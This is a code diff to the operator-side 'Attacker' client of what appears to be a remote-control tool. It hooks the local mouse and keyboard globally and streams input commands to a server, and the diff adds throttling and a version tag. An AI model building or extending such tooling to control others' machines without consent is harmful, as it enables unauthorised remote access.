@@ -21,6 +21,7 @@ Attacker::Attacker(std::string inHId, ftxui::Tui& inTui)
 	auto publ = sf::IpAddress::getPublicAddress().value_or(sf::IpAddress::Any).toString();
 	tui.setTitle(" " + myHId + " - " + priv + " / " + publ);
 
+	mouseTimer.start();
 	std::thread([] {
 		auto m = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0);
 		auto k = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
@@ -203,7 +204,7 @@ void Attacker::connectServer(bool pw, std::string ipStr, short port)
 	sf::Packet req;
 	uint16_t reqId = requestId++;
 	auto cmd = (pw) ? Cmd::REGISTER_ADMIN : Cmd::REGISTER_ATTACKER;
-	req << reqId << std::uint8_t(cmd) << myHId;
+	req << reqId << std::uint8_t(cmd) << std::string("#v0.0.1#") << myHId;
 	if (pw)
 		req << password;
 	if (server.send(req) != sf::Socket::Status::Done) {
@@ -679,7 +680,7 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 			break;
 		}
 		case WM_XBUTTONUP: {
-			int which = HIWORD(par->mouseData);			
+			int which = GET_WHEEL_DELTA_WPARAM(par->mouseData);
 			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_RELEASE) << uint8_t(3 + which);
 			_ = attacker->server.send(p);
 
@@ -693,8 +694,11 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 			break;
 		}
 		case WM_MOUSEMOVE: {
+			if (attacker->mouseTimer.getElapsedTime().asMilliseconds() < 80)
+				break;
+
 			auto size = sf::Vector2f(sf::VideoMode::getDesktopMode().size);
-			auto pos = sf::Vector2f(LOWORD(lParam), HIWORD(lParam)).componentWiseDiv(size);
+			auto pos = sf::Vector2f(sf::Mouse::getPosition()).componentWiseDiv(size);
 
 			int x = std::round(std::min(std::max(pos.x, 0.f), 1.f) * (UINT16_MAX - 1));
 			int y = std::round(std::min(std::max(pos.y, 0.f), 1.f) * (UINT16_MAX - 1));
@@ -702,6 +706,8 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 			sf::Packet p;
 			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_POS) << uint16_t(x) << uint16_t(y);
 			auto _ = attacker->server.send(p);
+			attacker->mouseTimer.restart();
+			break;
 		}
 		}
 	}
